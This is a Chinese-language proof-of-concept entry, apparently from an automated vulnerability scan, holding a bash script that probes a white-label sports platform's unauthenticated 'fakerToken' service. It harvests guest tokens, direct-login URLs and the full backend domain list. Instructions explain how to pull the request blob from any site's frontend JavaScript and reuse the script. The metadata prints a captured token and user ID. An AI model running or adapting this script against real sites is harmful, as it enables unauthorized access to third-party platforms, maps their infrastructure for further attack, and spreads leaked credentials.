# fakerToken 服务无鉴权探测：/fbsport/v1/getToken 与 /ob/v2/getTryToken 泄漏后端域名与 token

- **code**: fakertoken-服务无鉴权探测-fbsport-v1-gettoken-与-ob-v2-gettrytoken-泄漏后端域名与-token
- **kind**: script
- **category**: info-leak
- **component**: fakerToken (白标体育供应商 guest token 服务)
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 在 example.com 上实测：/fbsport/v1/getToken 返回 200 与 12 组 domainList（20 个域名，含 target304.example.com、wss://target305.example.com、target306.example.com 等）；/ob/v2/getTryToken 三次调用返回恒定 token=8b2af1ff66e9aceb5e5b4d981ac82e1a332ed22b 与 userId=528925123876225549 及可用 loginUrl；/common/v1/hotLegues/getHotLegues 返回 38461 字节真实联赛数据。均无需任何凭据。
- **path**: pocs/fakertoken-服务无鉴权探测-fbsport-v1-gettoken-与-ob-v2-gettrytoken-泄漏后端域名与-token/fakertoken_recon.sh
- **tags**: fakerToken,guest token,未授权,信息泄露,requestData,form编码,线路域名路由表,白标供应商,体育平台,ob体育
- **created_at**: 2026-10-10T18:42:26.575Z
- **found_by**: vuln-scan

## 描述

白标体育供应商的前端 guest-token 服务：把 requestData 硬编码在前端 JS 里，服务端只认 Content-Type: application/x-www-form-urlencoded（json 会返回 50040 系统错误），无任何鉴权即可取回 guest token 与全部后端域名列表。换个站点只要前端还引用 fakerToken 服务（常量名 FAKER_TOKEN / FAKER_TOKEN_BASE_URL），同一套 blob 与请求形态可直接复用。

## 用法

```
1) 从目标站前端主包提取 blob：grep -oE 'FAKER_TOKEN,"/fbsport/v1/getToken",\{requestData:"[^"]+"\}' index.js，取引号内值赋给 BLOB；2) 执行脚本并把 BASE 换成前端常量 FAKER_TOKEN_BASE_URL 的值；3) 输出里的 domainList 即目标全部后端域名（API/WS/H5/PC/静态/播放器），getTryToken 的 token+loginUrl 可直连该体育平台。
```

## 正文

```
#!/usr/bin/env bash
# fakerToken 服务无鉴权探测（换站点复用：改 BASE 与 BLOB）
set -u
BASE="${BASE:-https://example.com}"
BLOB="${BLOB:-JFAeOXkY7T76H6p5I6P1p4r1D7So14BcD6jCJ6ILPysVSswgEBBHFOp8bDlV/pEx/qQcoK2DFZVY9a0s2xr5oGxAUI+HBriQsoHKwTDfDL1luH+b/kEOcH0T1X1Sfln1jWG36yuZAS+AdM9bwv0s+HH6GMkBxsAYSziYo39vxEWcsjZDjtwzeENQ/4A0PHWSa7P7hHcwlu6qwwoR82yAGFP+sZLxbNtADDWjTXlskFcn0aYb7ftDeEaeoGPvWUuYhig9fxJ/XzltQSATPf8zO/dXLWTwyIgc7YcR1xYzjkhu069ejxgexqUjO1bhdbURl8DaQOVcB39txxQ2z4EQbVGe5K8zytputcvRijLTdVoKCFWzNTjzHE5JaDg06w5G3d9Zopbd4PK6637xHvQx5vA/OUr9dgVDIQGQDA6EoOWyZwyATU3fP1zeOj9TOTsa7Zo4ybmNGBAhB0najp5sSOxKa4lmqMLC4vAIBIcJinme7vnMMEehKhjUDDAvkuzxLfxiwzcKw/crbnNKKFvxDQG2XsbJHOLM/Dr4tK7puDscdG3iAkwiFdEKFvWq8+/DoqxeVstr53k0Qd+PejVjWeQWIHNOfzmDlv2KWoXaXfZ7eFaqg31KDw9mex5IKO9zsYXS7yzPzHg1l8/6/rr8K8my4IAKD3/RAk3jHJXvVwT+S4E1a1N+Sy+l6dex3gkb}"

echo "=== [1] guest FB token + 后端域名清单（必须是 form，json 会 50040）==="
curl -sk -X POST "$BASE/fbsport/v1/getToken" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "requestData=$BLOB" | tee /tmp/faker_fb.json | head -c 2000
echo

echo "=== [2] guest OB token + 可直连 loginUrl ==="
curl -sk -X POST "$BASE/ob/v2/getTryToken" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "product=rb" --data-urlencode "requestData=$BLOB" | head -c 2000
echo

echo "=== [3] 真实联赛数据（无鉴权）==="
curl -sk -X POST "$BASE/common/v1/hotLegues/getHotLegues" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "requestData=AAAA" | head -c 500
echo

echo "=== [4] 提取全部后端域名 ==="
grep -oE '"(https?|wss?)://[A-Za-z0-9.-]+"?' /tmp/faker_fb.json | tr -d '"' | sort -u

```
